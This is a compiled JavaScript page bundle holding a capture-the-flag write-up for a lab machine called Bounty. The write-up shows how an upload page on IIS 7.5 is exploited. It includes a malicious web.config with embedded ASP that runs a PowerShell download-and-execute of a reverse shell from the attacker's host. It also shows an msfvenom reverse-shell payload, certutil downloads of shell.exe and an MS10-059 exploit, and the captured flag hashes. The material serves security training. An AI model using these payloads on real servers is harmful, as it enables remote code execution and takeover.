(window.webpackJsonp=window.webpackJsonp||[]).push([[71],{412:function(t,a,s){"use strict";s.r(a);var e=s(13),n=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"bounty"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#bounty"}},[t._v("#")]),t._v(" Bounty")]),t._v(" "),a("p",[t._v("IP: "),a("code",[t._v("10.10.10.93")])]),t._v(" "),a("h2",{attrs:{id:"enumerattion"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#enumerattion"}},[t._v("#")]),t._v(" Enumerattion")]),t._v(" "),a("p",[t._v("Only port 80 is open according to nmap. It is running on mirosoft IIS 7.5.")]),t._v(" "),a("p",[t._v("There's also an interesting file at the path "),a("code",[t._v("http://10.10.10.93/transfer.aspx")]),t._v(" where we can upload files.")]),t._v(" "),a("p",[t._v("Trying to upload a random "),a("code",[t._v(".txt")]),t._v(" file didn't work however, so it seems like the options are rather limited.")]),t._v(" "),a("p",[t._v("Trying out a few file formats, we find that uploading files with an extension of "),a("code",[t._v(".jpg")]),t._v(" is allowed.")]),t._v(" "),a("p",[t._v("And with gobuster, we see that the path "),a("code",[t._v("http://10.10.10.93/uploadedfiles/")]),t._v(" is where our uploaded files will be at.")]),t._v(" "),a("p",[t._v("Our first image path is "),a("code",[t._v("http://10.10.10.93/uploadedfiles/482732.jpg")]),t._v(" and it returns our image.")]),t._v(" "),a("p",[t._v("interestingly enough, after a few minutes the file is garbled up and unviewable. This might be something that the garbage collection for the web app is cleaning up files.")]),t._v(" "),a("p",[t._v("Additionally, we can also upload "),a("code",[t._v(".config")]),t._v(" files, so we can upload something like "),a("code",[t._v("web.config")]),t._v(" and make it run "),a("code",[t._v("asp")]),t._v(" code for us.")]),t._v(" "),a("p",[t._v("So we use the following web.config code:")]),t._v(" "),a("div",{staticClass:"language-xml extra-class"},[a("pre",{pre:!0,attrs:{class:"language-xml"}},[a("code",[a("span",{pre:!0,attrs:{class:"token prolog"}},[t._v('<?xml version="1.0" encoding="UTF-8"?>')]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("configuration")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n   "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("system.webServer")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n      "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("handlers")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("accessPolicy")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("Read, Script, Write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n         "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("add")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("web_config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("path")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("*.config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("verb")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("modules")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("IsapiModule"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("scriptProcessor")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("%windir%\\system32\\inetsrv\\asp.dll"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("resourceType")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("Unspecified"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("requireAccess")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("Write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("preCondition")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("bitness64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("         \n      "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("handlers")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n      "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("security")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n         "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("requestFiltering")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n            "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("fileExtensions")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n               "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("remove")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("fileExtension")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v(".config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n            "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("fileExtensions")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n            "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("hiddenSegments")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n               "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("remove")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("segment")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("web.config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n            "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("hiddenSegments")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n         "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("requestFiltering")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n      "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("security")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n   "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("system.webServer")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("configuration")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('\n<%\nSet objShell = CreateObject("WScript.Shell")\nSet cmd = objShell.Exec("cmd /c powershell -c IEX (New-Object Net.WebClient).downloadstring(\'http://10.10.14.27/mini-reverse.ps1\')")\no = cmd.StdOut.Readall()\nResponse.write(o)\n%>\n')])])]),a("p",[t._v("while serving a powerscript reverse shell file on 80 and a listerner on 443 and we get back a reverse shell as "),a("code",[t._v("bounty\\merlin")])]),t._v(" "),a("p",[t._v("user.txt: "),a("code",[t._v("e29ad89891462e0b09741e3082f44a2f")])]),t._v(" "),a("h2",{attrs:{id:"foothold"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#foothold"}},[t._v("#")]),t._v(" Foothold")]),t._v(" "),a("p",[t._v("We upload a shell to "),a("code",[t._v("C:\\Users\\merlin\\Desktop")]),t._v(" and execute that to get another shell this time with more output")]),t._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[t._v("msfvenom "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/shell_reverse_tcp "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".14.27 "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("5555")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" exe "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" shell.exe\n")])])]),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[t._v("certutil.exe "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-urlcache")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-split")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://10.10.14.27/shell.exe"')]),t._v(" C:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Users"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("merlin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Desktop"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("shell.exe\n")])])]),a("h2",{attrs:{id:"priv-esc"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[t._v("#")]),t._v(" Priv esc")]),t._v(" "),a("p",[t._v("We see that ms10-059 is available.")]),t._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[t._v("certutil.exe "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-urlcache")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-split")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://10.10.14.27/MS10-059.exe"')]),t._v(" C:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Users"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("merlin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Desktop"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("MS10-059.exe\n")])])]),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[t._v("C:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Users"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("merlin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Desktop"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("MS10-059.exe "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".14.27 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6666")]),t._v("\n")])])]),a("p",[t._v("and listening on port "),a("code",[t._v("6666")]),t._v(", we get back a root shell.")]),t._v(" "),a("p",[t._v("root.txt: "),a("code",[t._v("c837f7b699feef5475a0c079f9d4f5ea")])])])}),[],!1,null,null,null);a.default=n.exports}}]);